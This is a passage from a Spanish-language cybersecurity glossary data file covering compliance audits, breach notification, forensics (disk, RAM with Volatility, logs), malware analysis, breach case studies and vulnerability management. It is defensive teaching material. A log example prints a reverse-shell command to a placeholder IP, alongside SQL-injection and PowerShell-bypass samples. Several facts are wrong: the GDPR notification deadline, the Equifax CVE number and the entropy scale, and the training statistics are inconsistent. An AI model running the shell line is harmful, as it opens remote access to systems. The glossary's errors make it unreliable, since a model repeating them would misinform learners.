    detail: "**SOC 2 (System and Organization Controls)** — Auditoria de controles\n- Tipo I: reporte de diseño (¿controles están diseñados correctamente?)\n- Tipo II: reporte de operación durante 6-12 meses (¿funcionan en práctica?)\n- 5 áreas: Security, Availability, Processing Integrity, Confidentiality, Privacy\n- Auditor independente (Big 4: Deloitte, EY, KPMG, PwC)\n- Resultado: reporte público (confianza a clientes)\n\n**ISO 27001** — Certificado de SGSI (Security Info Management System)\n- 114 controles en 14 categorías\n- Auditoría externa anual + surveillance audits\n- Certificado válido por 3 años\n- Más riguroso que SOC 2 (nivel enterprise)\n\n**Penetration Testing & Vulnerability Assessment**\n- PCI-DSS obliga pen test anual (por tercero)\n- Reporte profesional con CVSS scores\n- Hallazgos categorizados: Crítico/Alto/Medio/Bajo\n- Remediación verificada en re-test\n\n**Proceso auditoría típico:**\n```\n1. Selección auditor (3-4 empresas, propuestas)\n2. Pre-audit (preparar documentación)\n3. Audit on-site (2-4 semanas)\n   - Entrevistas staff\n   - Revisión código, logs, configs\n   - Pruebas de controles (¿funciona MFA?)\n   - Pen testing (si aplica)\n4. Findings report (hallazgos)\n5. Management response (plan de remediación)\n6. Follow-up (verify fixes)\n7. Final report (release)\n```\n\n**Evitar hallazgos comunes:**\n- Claves compartidas/hardcodeadas\n- Acceso sin MFA\n- Logs no monitoreados\n- Encryption incompleta (solo DB, no tránsito)\n- Documentación desactualizada\n- Permisos excesivos (PoLP violation)\n- Patch management débil\n- Incident response plan ausente",
    examples: ["SOC 2 Tipo II: 12 meses operación perfecta → cliente Fortune 500 vende con confianza", "ISO 27001: 114 controles → 3 hallazgos críticos → remediación 3 meses → re-audit → certificado"],
    related: ["Compliance", "Auditing", "Certifications"],
  },
  {
    id: 592,
    module: 56,
    term: "Breach notification y incident disclosure",
    short: "Requisitos legales post-breach: timing, contenido, notify autoridades y usuarios.",
    detail: "**Cuándo notificar:**\n- GDPR: \"without undue delay\" (28 días al DPA)\n- HIPAA: 60 días a usuarios + médios + HHS (si >500 afectados)\n- California CCPA: \"earliest practicable time\"\n- Mayoría leyes: 30-60 días\n\n**A quiénes notificar:**\n1. Autoridades (regulador, DPA, AG)\n2. Usuarios afectados (individuales)\n3. Medios (si breach masivo)\n4. Clientes (si SaaS, notif a ellos tambien)\n5. Aseguradora (cyber insurance)\n\n**Contenido de notificación:**\n```\nEmail template:\n─────────────────\nSubject: Security Incident Notification\n\nDear Customer,\n\nWe recently discovered that [DATE] unauthorized individuals gained \naccess to our systems. The incident affected [X] users.\n\nInformation compromised:\n• Names and email addresses\n• Hashed passwords (bcrypt, salted)\n• NOT: credit cards, SSNs\n\nActions we took:\n• Incident investigation (forense)\n• Compromised accounts reset\n• Enhanced monitoring activated\n• Patched vulnerability\n\nActions you should take:\n• Change password immediately\n• Enable two-factor authentication\n• Monitor for phishing\n• Consider credit freeze if SSN involved\n\nMore information: https://security.company.com/incident-2025-xxx\n\nWe apologize for the incident. Security is our top priority.\n\nSecurity Team\n─────────────────\n```\n\n**Documentación requerida:**\n- [ ] Timeline exacto (cuándo began, cuándo detected, cuándo remediated)\n- [ ] Scope (cuántos usuarios, qué datos)\n- [ ] Root cause analysis (¿cómo pasó?)\n- [ ] Forensic report (evidencia)\n- [ ] Remediation steps (qué hiciste)\n- [ ] Prevention measures (para no repetir)\n- [ ] Third party notification (abogados, seguros)\n\n**Riesgos de mala notificación:**\n⚠️ Tarde (>60 días): fina regulatoria + litigios de usuarios\n⚠️ Contenido incompleto: usuarios no saben riesgo real\n⚠️ Tono defensivo: trust erosion, bad PR\n⚠️ Revelar técnicas de ataque: copia atacante\n\n**Good practice:**\n✅ Notificar RÁPIDO (mejor pronto que tarde)\n✅ Transparencia (qué pasó, qué data)\n✅ Acción clara (qué user debe hacer)\n✅ Compensación (credit monitoring gratis)",
    examples: ["Equifax 2017: 147M SSNs leaked → late notification → $700M settlement", "GitHub 2021: token exposed → 24h notification → credit monitoring offered → trust maintained"],
    related: ["Incident response", "Legal", "Privacy"],
  },
  {
    id: 593,
    module: 56,
    term: "Gestión de evidencia y chain of custody",
    short: "Procedimiento forense para que hallazgos sean admisibles legalmente.",
    detail: "**Chain of Custody** = documentación de quién tuvo acceso a la evidencia, cuándo, dónde.\n\nCrucial para: litigios, criminal prosecution, arbitraje.\n\n**Procedimiento:**\n```\nIncident happens (11:32 UTC)\n  ↓\nAislamiento inmediato (freeze estado)\n  → No tocar sin guantes, documentar foto\n  → Solo técnicos autorizados\n  → No conectar a Internet si posible\n  ↓\nCaptura forense\n  → Hash MD5/SHA256 de disco completo\n  → Documentar serial#, timestamp\n  → Timestamp notarizado si crítico\n  ↓\nAlmacenamiento seguro\n  → Caja fuerte, acceso restringido\n  → Log de acceso (quién, cuándo)\n  → Temperatura controlada (no degrade)\n  ↓\nManipulación limitada\n  → Cada acceso documentado\n  → Solo en ambiente limpio/aislado\n  → Todo cambio hasheado\n  ↓\nReporte legal\n  → Certified forensic analyst firma\n  → Timestamp notarizado\n  → Método reproducible\n```\n\n**Cadena de custodia (CoC form):**\n```\nItem:  Desktop Computer (Dell XPS-123)\nDate seized: 2025-06-15 14:32 UTC\nSeized by: John Doe (Incident Responder)\n\n┌────────────────────────────────────────┐\n│ Chain of Custody Log                   │\n├─────────────┬──────────┬──────────┬────┤\n│ Date/Time   │ Who      │ Action   │ Location │\n├─────────────┼──────────┼──────────┼────┤\n│ 2025-06-15  │ John Doe │ Seized   │ Office │\n│ 14:32 UTC   │          │ (photo:x)│       │\n│             │          │ Hash:    │       │\n│             │          │ abc123   │       │\n├─────────────┼──────────┼──────────┼────┤\n│ 2025-06-15  │ Jane SM  │ Received │ Lab   │\n│ 15:45 UTC   │ (Analyst)│ (verify  │       │\n│             │          │ hash ok) │       │\n├─────────────┼──────────┼──────────┼────┤\n│ 2025-06-16  │ Jane SM  │ Analyzed │ Lab   │\n│ 09:00 UTC   │ (Analyst)│ (mounted │       │\n│ - 17:30 UTC │          │ RO, took │       │\n│             │          │ dd image)│       │\n└─────────────┴──────────┴──────────┴────┘\n```\n\n**Errores que invalidan evidencia:**\n❌ Cambiar datos sin documentar (hash mismatch)\n❌ Acceso no autorizado (tampering risk)\n❌ Falta de timestamp (cuándo sucedió?)\n❌ Contacto con red (dilución evidencia)\n❌ Técnico no certificado (no admisible en court)\n\n**Herramientas forense estándar:**\n- **EnCase** (Guidance Software) — estándar legal\n- **FTK** (Forensic Toolkit) — análisis imágenes de disco\n- **Volatility** — análisis memoria RAM\n- **WinHex** — hex editor con capacidades forenses\n- **dd** (Linux) — copia byte-by-byte con verificación hash",
    examples: ["Chain of Custody perfecto → hallazgo malware admisible en corte → prosecusión", "Cadena rota (acceso no documentado) → evidencia rechazada → criminal escapa"],
    related: ["Forensics", "Legal evidence", "Digital investigation"],
  },
  {
    id: 594,
    module: 56,
    term: "GRC: Governance, Risk, Compliance",
    short: "Marco integral: estrategia de riesgo, políticas, controles auditados.",
    detail: "**GRC** = sistema integrado de control empresarial.\n\n**Governance** (Gobernanza)\n- Decisiones de seguridad top-down\n- Board oversight de cyber risk\n- CISO reports directo a CEO/Board\n- Políticas de seguridad formales\n- Asignación de roles/responsabilidades\n\n**Risk Management**\n- Identificar riesgos (threat modeling)\n- Evaluar (probabilidad × impacto)\n- Priorizar (¿qué es crítico?)\n- Mitigar (controles)\n- Monitor (KRIs — Key Risk Indicators)\n\n**Risk Score:**\n```\nRisgo = (Probabilidad × Impacto)\n\nEjemplo: Data Breach\n├─ Probabilidad: 3/10 (APT puede atacar)\n├─ Impacto: 9/10 (PII de 1M usuarios)\n└─ Risk Score: 3 × 9 = 27/100 (ALTO)\n\nMitigación:\n├─ +Encryption at rest (reduce impacto a 6)\n├─ +SIEM monitoring (reduce probabilidad a 2)\n└─ Risk Score nuevo: 2 × 6 = 12/100 (ACEPTABLE)\n```\n\n**Compliance**\n- Auditorías externas (SOC 2, ISO 27001)\n- Compliance posture management (tools tipo Tenable, Qualys)\n- Remediation tracking\n- Exception management (qué riesgos aceptas formalmente)\n\n**Frameworks GRC:**\n- **COSO** (Committee of Sponsoring Organizations) — control interno\n- **COBIT** (Control Objectives for IT) — IT governance\n- **ISO 31000** — Risk management estándar\n- **NIST RMF** (Risk Management Framework)\n\n**Maturity levels (capability):**\n```\n1. Ad-hoc     — No hay proceso formal\n2. Repeatable — Algunos procesos documentados\n3. Defined    — Procesos formales, roles claros\n4. Managed    — Métricas, monitoreo\n5. Optimized  — Mejora continua, automation\n```\n\n**Roles típicos:**\n- **CISO** — Chief Information Security Officer (estrategia, board)\n- **Security Manager** — Implementación de políticas\n- **Risk Officer** — Cálculo/tracking de riesgos\n- **Compliance Officer** — Auditorías, reportes reguladores\n- **Internal Audit** — Verifica cumplimiento de políticas\n\n**KPIs/Métricas de GRC:**\n- Vulnerabilidades encontradas / remediadas (SLA)\n- MTTR (Mean Time To Remediate)\n- % Policies signed annually\n- Audit findings trend\n- Risk score trending\n- Training completion rate",
    examples: ["Board decision: cyber budget $5M next year → based on GRC risk assessment", "Compliance violation found → exception process → mitigated → approved by CISO → documented"],
    related: ["Risk management", "Governance", "Compliance frameworks"],
  },

  // ── M57 · Advanced Forensics ────────────────────────────────────────────
  {
    id: 600,
    module: 57,
    term: "Análisis avanzado de disco y filesystem",
    short: "Recuperación de archivos borrados, artefactos NTFS/ext4, timeline análisis.",
    detail: "**Recuperación de archivos borrados:**\n\n**Cómo funciona:**\nCuando borra archivo:\n```\nANTES:\n─────────────────────\nMaster Boot Record (MBR)\n├─ File Allocation Table (FAT)\n│  ├─ Cluster 100: FILE_A (allocated)\n│  ├─ Cluster 101: FILE_A (allocated)\n│  └─ Cluster 102: FREE\n└─ Directory Entry\n   └─ FILE_A → starts at cluster 100, size 8KB\n\nDESPUÉS DE DELETE (sin secure wipe):\n─────────────────────────────────────\nMaster Boot Record (MBR)\n├─ File Allocation Table (FAT)\n│  ├─ Cluster 100: FREE ← marcado como libre\n│  ├─ Cluster 101: FREE ← marcado como libre\n│  └─ Cluster 102: FREE\n└─ Directory Entry\n   ├─ FILE_A → DELETED (entrada preservada en journal)\n   │           data PHYSICAMENTE AÚN EN DISCO\n   └─ timestamp: deleted_at=2025-06-15 14:32\n\nLa DATA PERSISTE hasta que se overwrite\n(puede ser semanas/meses si disco not full)\n```\n\n**Herramientas de recuperación:**\n- **Recuva** (Windows, GUI)\n- **ext3grep** (Linux ext3/ext4)\n- **sleuthkit** (testdisk, fls, icat)\n- **PhotoRec** (recovery fotos/docs)\n\n**Análisis de artefactos NTFS:**\n```\nNTFS preserva muchísima metadata:\n├─ MFT (Master File Table) — entry por cada file/folder\n├─ $LogFile — transaction log (qué se modificó)\n├─ $UsnJournal — USN Change Journal (timestamp de modificación)\n├─ AlternateDataStreams — datos \"escondidos\"\n└─ Timestamps de archivo:\n   ├─ Created\n   ├─ Accessed (puede deshabilitarse)\n   ├─ Modified\n   └─ MFT Changed (siempre actualizado)\n\nTimeline forense:\n2025-06-15 08:00 — file.txt CREATED\n2025-06-15 08:15 — file.txt ACCESSED\n2025-06-15 14:30 — file.txt MODIFIED (payload malicioso agregado)\n2025-06-15 14:35 — file.txt ACCESSED (malware ejecutado)\n2025-06-15 15:00 — file.txt DELETED\n→ Cronología prueba que usuario no escribió malware (created 08:00, modified 14:30)\n```\n\n**ext4 Forensics:**\n```\nJournal entries preservan:\n├─ Inode changes\n├─ Extent allocation/deallocation\n├─ Deleted inodes pueden recuperarse si journal intact\n└─ Timestamps (crtime, mtime, atime)\n\nComando: debugfs\ndebugs:  dump_inode <inum>  # Muestra metadata inode\ndebugs:  logdump           # Muestra journal entries\n```",
    examples: ["Recovered deleted Excel file → contains embezzlement evidence → prosecution", "NTFS timeline: file modified 2h before incident report → proves premeditation"],
    related: ["Disk forensics", "File recovery", "Timeline analysis"],
  },
  {
    id: 601,
    module: 57,
    term: "Análisis de memoria (RAM) con Volatility",
    short: "Dumping y análisis de memory dumps para detectar malware, procesos inyectados.",
    detail: "**Memory Forensics** = obtener snapshot de RAM y analizar procesos, conexiones, código malicioso.\n\n**Ventaja: Captura estado VIVO**\n- Procesos corriendo (algunos anti-análisis si disco comprometido)\n- Conexiones activas (C2 callbacks)\n- Credenciales en memoria (lsass en Windows)\n- Código inyectado (shellcode, DLL injection)\n- Encryption keys (descifra datos on-the-fly)\n\n**Adquisición:**\n```bash\n# Windows (FTK Imager, Magnet RAM Capturer)\n# Linux\n  sudo dd if=/dev/mem of=memory.dump bs=1M\n  # O más seguro con LiME (Linux Memory Extractor)\n  sudo insmod lime-3.10.ko \"path=/root/memory.dump format=raw\"\n\n# Resultado: archivo gigante (4GB RAM = 4GB dump)\n```\n\n**Análisis con Volatility (Python tool):**\n```bash\n# Identificar profile (Windows version)\nvol.py -f memory.dump imageinfo\noutput: Windows 7 SP1 x64\n\n# Listar procesos corriendo\nvol.py -f memory.dump --profile=Win7SP1x64 pslist\noutput:\nPID  Name                Offset\n4    System\n364  svchost.exe         0x3f6b0410\n520  explorer.exe        0x3f7ab410\n1024 mimikatz.exe ← SUSPICIOUS (!)  \n\n# Conexiones de red\nvol.py -f memory.dump --profile=Win7SP1x64 netscan\noutput:\nProtocol Local Address      Remote Address      State   PID\nTCP     192.168.1.100:49212 1.2.3.4:443        ESTABLISHED 1024 (mimikatz!)\n# C2 connection detected!\n\n# Extraer proceso sospechoso (dump executable)\nvol.py -f memory.dump --profile=Win7SP1x64 procdump -p 1024 -D ./\noutput: mimikatz.1024.exe\n# Hash it, submit to VirusTotal\n\n# Buscar strings (credenciales, URLs)\nvol.py -f memory.dump --profile=Win7SP1x64 strings | grep -i password\noutput:\n\"password123\"\n\"Admin@2025\"\n\n# DLL injection detection (detectar procesos comprometidos)\nvol.py -f memory.dump --profile=Win7SP1x64 malfind -p 364\noutput: Found 3 suspicious memory regions in svchost.exe (PID 364)\n→ Probable shellcode inyectado\n```\n\n**Volatility plugins importantes:**\n| Plugin | Función |\n|---|---|\n| `pslist` | Procesos corriendo |\n| `pstree` | Árbol de procesos (parent-child) |\n| `netscan` | Conexiones TCP/UDP activas |\n| `handles` | Archivos/registros abiertos |\n| `lsadump` | SAM hashes (Windows credentials) |\n| `hivelist` | Registros Windows cargados |\n| `userassist` | Historial de ejecución |\n| `shimcache` | AppCompat registry (aplicaciones instaladas) |\n| `prefetch` | Prefetch files (aplicaciones ejecutadas) |\n| `shellbags` | Ventanas del Explorer (donde navegó) |\n| `filescan` | Archivos referenciados en memoria |\n| `yarascan` | Búsqueda de patrones con YARA |\n\n**Casos de uso:**\n✓ Malware corriendo en RAM pero no en disco (fileless)\n✓ Credenciales en claro (antes de se transmitan)\n✓ Comandos PowerShell ejecutados\n✓ Procesos inyectados (exploits del kernel)\n✓ Prueba directa de ejecución (procesos en memoria)",
    examples: ["Fileless malware: disk looks clean → memory dump shows mimikatz.exe → source C2", "Ransomware: memory analysis reveals AES key in plaintext → decrypt files"],
    related: ["Memory analysis", "Malware detection", "Volatility"],
  },
  {
    id: 602,
    module: 57,
    term: "Log forense y análisis de eventos",
    short: "Windows Event Log, Linux syslog, timeline reconstrucción de ataques.",
    detail: "**Logs = audit trail de lo que pasó**\n\n**Windows Event Log:**\n```\nCanales principales:\n├─ System — kernel, drivers, hardware\n├─ Security — logon/logoff, policy changes, object access\n├─ Application — app errors, custom events\n└─ PowerShell Operational — PowerShell commands executed\n\nEvento Security crítico:\nEvent ID 4624 (Successful Logon)\n├─ Timestamp: 2025-06-15 14:32:45.123\n├─ User: DOMAIN\\Admin\n├─ Logon Type: 3 (Network, ej: RDP)\n├─ Source IP: 192.168.1.100\n├─ Target: ComputerA\n└─ Status: Success\n\nEvento Security 4625 (Failed Logon)\n├─ Multiple 4625s en corto tiempo = Brute force attack\n\nEvento Security 4688 (Process Created)\n├─ ParentImage: cmd.exe\n├─ Image: powershell.exe\n├─ CommandLine: \"powershell.exe -NoProfile -ExecutionPolicy Bypass -File malware.ps1\"\n└─ User: DOMAIN\\Attacker ← Quien ejecutó\n```\n\n**Linux/Unix logs:**\n```\n/var/log/auth.log — authentication\n├─ SSH login attempts\n├─ sudo commands\n└─ su (switch user)\n\n/var/log/syslog — sistema\n├─ Kernel messages\n├─ Device drivers\n└─ System services\n\n/var/log/apache2/access.log — HTTP requests\n├─ Timestamp\n├─ IP origen\n├─ Request (GET /admin.php?id=1' OR '1'='1)\n└─ Status code (200, 404, 500)\n\nAudit daemon (/var/log/audit/audit.log):\n├─ Syscall monitoring\n├─ File access\n└─ Network connections\nEjemplo:\naudit[1487203200.000:1234]: type=EXECVE msg=audit(...):\n  exe=\\\"/bin/bash\\\" cmdline=\\\"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\\\"\n  → Reverse shell detectado\n```\n\n**Timeline reconstruction:**\n```\nIncident: Datos robados 2025-06-15 a las 19:00\n\nTimeline forense (trabajar hacia atrás):\n19:00 — Data exfiltration logs: 500MB transferred to 1.2.3.4\n18:55 — VPN session starts from 1.2.3.4\n18:45 — VPN credentials used (but from where?)\n18:30 — RDP session from 192.168.1.50 to server\n18:20 — Kerberoasting detection (hash dumping attempt)\n18:00 — Compromised workstation 192.168.1.50 starts scanning\n17:45 — Phishing email received (attachment opened)\n\n→ Cadena causal: Phishing → Malware en workstation → Scan red → \n   Kerberoasting → VPN compromise → Data theft\n```\n\n**Herramientas análisis:**\n- **Log Parser Studio** (Microsoft) — queries Windows Event Log\n- **Splunk** — centraliza + busca logs\n- **ELK** (Elasticsearch, Logstash, Kibana) — open-source log aggregation\n- **Sigma** — reglas genéricas que funcionan en cualquier SIEM\n- **Timeline tools** — Plaso (automated timeline generation)\n\n**Desafios:**\n⚠️ Logs deshabilitados (attacker los apaga)\n⚠️ Rotación de logs (old events se pierden)\n⚠️ Sincronización de timestamp (clocks desfasados entre hosts)\n⚠️ Timestamp spoofing (malware puede modificar en memoria)",
    examples: ["Event ID 4624 + PowerShell command injection = proves execution path", "Apache logs: SQL injection attempt 10:00 → shell created 10:05 → data stolen 10:30"],
    related: ["Forensic analysis", "Logging", "Timeline reconstruction"],
  },
  {
    id: 603,
    module: 57,
    term: "Análisis de malware y reverse engineering",
    short: "Desemsamblado, debugging, comportamiento malware en sandbox, extracción de IoCs.",
    detail: "**Static Analysis** (sin ejecutar)\n```bash\n# File type & entropy\nfile sample.exe\noutput: PE32 executable (GUI) Intel 80386, ... executable\n\n# Entropy (0-7 scale, >6 = encrypted/packed)\nent sample.exe\noutput: Entropy = 7.2 (PACKED malware!)\n\n# Strings (buscar URLs, keys hardcodeadas)\nstrings sample.exe | grep -i \"http\"\noutput:\nhttp://attacker-c2.com/gate.php\nhttp://attacker-c2.com/upload\n\n# Imports (qué DLLs usa)\nnmtools -i sample.exe\noutput:\nmscoree.dll (.NET runtime) → .NET malware\nkernel32.dll (system calls)\nwininet.dll (network) → comunicación C2\n\n# YARA scanning (malware signatures)\nyara evil_malware_signatures.yar sample.exe\noutput:\nWannaCry.Gen1 MATCH (98% confidence)\n```\n\n**Dynamic Analysis** (ejecutar en sandbox)\n```\nAmbiente:\n├─ VirtualBox/VMware VM aislada\n├─ Sin red real (simular con fake DNS)\n├─ Herramientas monitoreo: Wireshark, ProcMon\n└─ Snapshot antes de ejecutar (rollback post)\n\nMonitoreo:\n├─ Procesos creados/eliminados\n├─ Archivos modificados/creados (típicamente %temp%)\n├─ Conexiones de red (C2 callbacks)\n├─ Cambios en registro (persistence hooks)\n└─ Comportamiento destructivo (encryption)\n\nResultado típico:\nProcess: malware.exe\n├─ Creates: C:\\\\temp\\\\payload.exe\n├─ Modifies: HKLM\\\\Run (persistence)\n├─ Connects: 1.2.3.4:443 (C2)\n├─ Encrypts: C:\\\\Users\\\\**\\\\*.docx\n└─ Kills: explorer.exe (crash desktop)\n```\n\n**Herramientas sandbox:**\n- **Cuckoo** (open-source, self-hosted)\n- **Any.run** (cloud, instant report)\n- **Joe Sandbox** (comercial, advanced ML)\n- **VirusTotal** (envía archivo, análisis + community)\n\n**Reverse Engineering (debugger):**\n```\nIDA Pro / Ghidra (desensamblar código):\n├─ Cargar ejecutable\n├─ Identificar funciones principales\n├─ Revert engineer lógica (C2 protocol, encryption)\n├─ Encontrar hardcoded keys, URLs\n└─ Generar IoCs (dominios, IPs, hashes)\n\nOllyDbg / x64dbg (debugger):\n├─ Ejecutar línea-por-línea\n├─ Breakpoints en funciones críticas (recv, send)\n├─ Inspeccionar registros/memoria\n└─ Modificar en vivo para tests\n```\n\n**Extracción de IoCs (Indicators of Compromise):**\n```\nDe análisis malware → IoCs:\n├─ File hash (MD5/SHA256) — detectar misma variante\n├─ Domain/IP C2 — bloquear en firewall\n├─ Filename patterns — detectar en otros hosts\n├─ Registry keys — indicadores de infection\n├─ Process names — procesos sospechosos\n└─ Behavioral patterns — YARA rules\n\nPublicar en:\n├─ MISP (Malware Information Sharing)\n├─ Threat feed (vendedores)  \n├─ Twitter (#malware community shares)\n└─ CISA alerts (gobierno USA)\n```",
    examples: ["Static: entropy 7.3 + WinInet imports + C2 domain → Packed malware", "Dynamic: file encryption + C2 callback → Ransomware confirmed → IoCs extracted"],
    related: ["Malware analysis", "Reverse engineering", "Sandbox analysis"],
  },
  {
    id: 604,
    module: 57,
    term: "Casos reales y post-mortem análisis",
    short: "Análisis de breaches publicados: WannaCry, NotPetya, SolarWinds, Equifax.",
    detail: "**WannaCry (2017)** — Ransomware masivo\n```\nAtaque:\n├─ Vulnerabilidad: EternalBlue (SMB exploit, MS17-010)\n├─ Dispersión: gusano (auto-propaga por red)\n├─ Payload: cifra archivos con RSA-2048\n├─ Impacto: 230K hosts en 150 países, $4B pérdidas\n\nTimeline forense:\n1. Exploit EternalBlue entra via patch no aplicado\n2. Cria proceso cmd.exe (ejecuta descarga)\n3. Descarga malware desde C2\n4. Itera red local (Nmap scan)\n5. Explota otros hosts SMB (spreads)\n6. Encripta archivos .pptx, .xlsx, .doc\n7. Muestra pantalla pidiendo rescate\n\nLecciones:\n✓ Microsoft parche disponible 2 meses antes\n✓ Falta de patch management = vulnerability\n✓ Segmentación de red limitó spread\n✓ Backups offline permitió recuperación\n❌ Sin backups = perdida total datos\n```\n\n**NotPetya (2017)** — Ransomware falsificado (es wiper)\n```\nCaso interesante: parecía ransomware pero NO dejaba recuperación\n→ Puro destructivo\n\nOrigen: Ataque a Ucrania (APT28), se propagó globalmente\n├─ Via compromised software update (SolarWinds precedente)\n├─ Exploit EternalBlue (SMB)\n├─ Corre como SYSTEM (system privs = max damage)\n\nValencia:\n├─ Maersk (naviera): $300M pérdida operacional\n├─ Merck: $670M pérdidas\n├─ Herramientas HQ quedaron offline semanas\n\nForense distinctive:\n├─ MBR corrupted (boot record destroyed)\n├─ Archivos sobrescritos con random data\n├─ Sin capacidad de \"rescue\" (clave privada no en C2)\n→ Conclusión: no ransomware, cyberwarfare/sabotaje\n```\n\n**SolarWinds (2020)** — Supply chain compromise\n```\nCompromised component:\n├─ SolarWinds Orion software\n├─ 18,000+ empresas + gobiernos usan\n├─ Actualización maliciosa distribuida oficialmente\n├─ APT29 (SVR ruso) atribución\n\nDetección tardía:\n├─ Diciembre 2020 (8 meses después de implantación)\n├─ Descubierto por FireEye (security firm, víctima)\n├─ Algunos compromised hasta 2024 (hallazgos recientes)\n\nImpacto:\n├─ Microsoft, Amazon, Tesla, intrusion detectada\n├─ US Federal agencies (Tesorería, Justicia) comprometidas\n├─ Acceso de larga duración (persistence)\n\nForense:\n├─ Beacon C2 connection cada 6 horas\n├─ Archivo SolarWinds instalado legitimamente\n├─ Análisis de DLL malicioso extraído de update\n└─ Comportamiento: reconnaissance, credential theft\n\nLecciones:\n✗ Software supply chain = trusted delivery, risky\n✗ Falta de code signing verification\n✗ Comportamiento C2 no detectado por SIEM\n✓ Multi-year detection delay → need better monitoring\n```\n\n**Equifax (2017)** — Data breach masivo\n```\nVulnerabilidad: Apache Struts RCE (CVE-2017-5645)\n├─ Patch disponible: Marzo 2017\n├─ Explotación: Mayo 2017 (2 meses sin parchear)\n├─ Data robada: 147M SSNs, nombres, DOB, addresses\n\nPost-breach forense discovery:\n├─ Anomalous outbound traffic (exfiltration)\n├─ Log examination: SQL queries extrayendo datos\n├─ Timeline: attacker in system 76 días antes de detection\n├─ Root cause: security team no revisó logs\n\nReacción:\n├─ Disclosure tardío (agosto, datos robados mayo)\n├─ $700M settlement (largest data breach payout)\n├─ Credit monitoring gratis ofrecido\n├─ Class action lawsuit\n\nForense findings:\n├─ Attacker creó admin account\n├─ Accessed: vault where encryption keys stored\n├─ Bypassed: web application firewall (WAF)\n├─ Exfiltrated: data via outbound HTTPS (blended in tráfico normal)\n```\n\n**Lecciones transversales:**\n1. **Parches**: siempre dentro de 30 días (o desconectar)\n2. **Segmentación**: ransomware spread reducible 50%+\n3. **Monitoring**: behavioral alerts (C2 detection, large exfil)\n4. **Backups**: offline + tested regularly (recovery plan)\n5. **Supply chain**: verificar integridad software (signatures)\n6. **Disclosure**: transparencia = confianza (vs cover-up)\n7. **Forense**: chain of custody crítica (legal liability)",
    examples: ["WannaCry: forensic shows EternalBlue in SMB traces + RSA key generation", "Equifax: 76 days in system undetected = SIEM rules too loose or logs not reviewed"],
    related: ["Case studies", "Breach analysis", "Lessons learned"],
  },

  // ── M58 · Security Culture & Management ─────────────────────────────────
  {
    id: 610,
    module: 58,
    term: "Capacitación de usuarios y phishing",
    short: "Security awareness training, phishing simulations, comportamiento humano.",
    detail: "**Estadísticas:**\n- 85% de breaches tienen componente humano (phishing, weak password, social engineering)\n- Usuarios entrenados: 50% click phishing\n- Usuarios sin entrenar: 95% click phishing\n→ Training reduce risk 90%\n\n**Tipos de training:**\n\n**1. Onboarding (nuevo empleado)**\n- Videos: \"¿Qué es phishing?\", \"Password security\", \"Reportar incidentes\"\n- Quiz: verificar comprensión\n- Signed acknowledgment (legal liability)\n\n**2. Annual training**\n- Obligatorio todos los años (compliance GDPR, HIPAA, PCI-DSS)\n- Cubre: confidentiality, incident reporting, MFA, data handling\n- Duration: 30-60 min\n\n**3. Role-specific training**\n- Developers: secure coding, OWASP Top 10, code review\n- Admins: least privilege, audit logging, patch management\n- Ejecutivos: governance, risk, compliance (C-suite perspective)\n\n**4. Phishing simulations**\n```\nMes 1:\n├─ Envía email phishing realista a 100% empleados\n├─ 30% cliquean malicious link\n├─ Los 30% reciben micro-training: \"Esta era simulación\"\n\nMes 6:\n├─ Retest: mismo ataque\n├─ 15% cliquean (50% improvement)\n├─ Refuerzo training\n\nMes 12:\n├─ Retest\n├─ 8% cliquean (training effective)\n```\n\n**Red flags employees should know:**\n- Urgencia artificial (\"ACTUA AHORA\" en mayúsculas)\n- Petición de password (legítimas tools nunca piden)\n- Links mispelled (amaz0n.com vs amazon.com)\n- Attachments inesperados (.exe, .zip)\n- Sender no familiar\n- Requests dinero/gift cards (social engineering clásico)\n\n**Reporting culture:**\n✓ Empleado recibe phishing → REPORTA (no borra)\n✓ Security team investiga\n✓ Reporter recibe reconocimiento\n✓ Equipo aprende del incidente\n\n❌ Cultura del miedo:\n├─ Empleado tiene miedo de reportar\n├─ Borra evidencia\n├─ Attacker continúa sin ser detectado\n└─ Breach crece\n\n**Métricas de training:**\n- % empleados completaron training\n- Phishing click rate (target: <5%)\n- Time to report (target: <30 min)\n- Training comprehension (quiz score)\n- Incidents self-reported vs detected by security",
    examples: ["Phishing sim: 25% click → targeted training → retest 8% click → ROI 3x", "Report-happy culture: phishing caught in 5 min → attacker kicked out before data stolen"],
    related: ["Awareness", "Human factors", "Culture"],
  },
  {
    id: 611,
    module: 58,
    term: "Gestión de vulnerabilidades (VRM)",
    short: "Ciclo: escanear, priorizar, remediar, verificar. SLA de parches.",
    detail: "**Vulnerability Management Process:**\n\n**1. Scanning**\n```\nHerramientas:\n├─ Nessus, OpenVAS (infraestructura)\n├─ Qualys, Tenable (cloud SaaS)\n├─ OWASP ZAP (aplicaciones web)\n\nFrecuencia:\n├─ Exploración mensual (infraestructura)\n├─ Post-deployment (nuevas aplicaciones)\n├─ Post-patch (verificar remediación)\n\nResultado:\n├─ Inventario de CVEs encontradas\n├─ CVSS score (0-10 severidad)\n├─ Evidencia (puerto abierto, versión software)\n└─ Recommendations (parche disponible sí/no)\n```\n\n**2. Priorización (Risk Score)**\n```\nRisk = (CVSS × Exploitability × Exposure)\n\nEjemplo:\nVuln: OpenSSL 1.0.2 (Heartbleed, CVE-2014-0160)\n├─ CVSS: 7.5 (Alto)\n├─ Exploitability: 10/10 (público, trivial)\n├─ Exposure:\n│  ├─ Internet-facing API → 10/10\n│  ├─ Internal database → 2/10\n│  └─ Developer laptop → 1/10\n\nRisk Scores:\n├─ Internet API: 7.5 × 10 × 10 = 750 (CRÍTICO, FIX IMMEDIATELY)\n├─ Internal DB: 7.5 × 10 × 2 = 150 (ALTO, próxima semana)\n└─ Laptop: 7.5 × 10 × 1 = 75 (BAJO, fix en sprints)\n```\n\n**3. Remediación (SLA)**\n```\nSLA típico por severidad:\n├─ CRÍTICO (>9.0): 24 horas\n├─ ALTO (7.0-8.9): 7 días\n├─ MEDIO (4.0-6.9): 30 días\n└─ BAJO (<4.0): 90 días\n\nAcciones de remediación (en orden de preferencia):\n1. Upgrade software (Apache 2.4.1 → 2.4.50)\n2. Patch (si upgrade no posible)\n3. Workaround (config change mitiga)\n   ├─ Deshabilitar protocolo inseguro (SSL 3.0 → TLS 1.2)\n   ├─ Firewall rule (block puerto)\n   └─ WAF rule (block requests)\n4. Aceptar riesgo (documentar decisión)\n```\n\n**4. Verificación (Re-scan)**\n```\nPost-remediación:\n├─ Re-scan infraestructura después de patch\n├─ Confirmar: CVSS score bajó o vuln desapareció\n├─ Si todavía presente: root cause analysis\n   ├─ ¿Patch aplicado pero servicio no reiniciado?\n   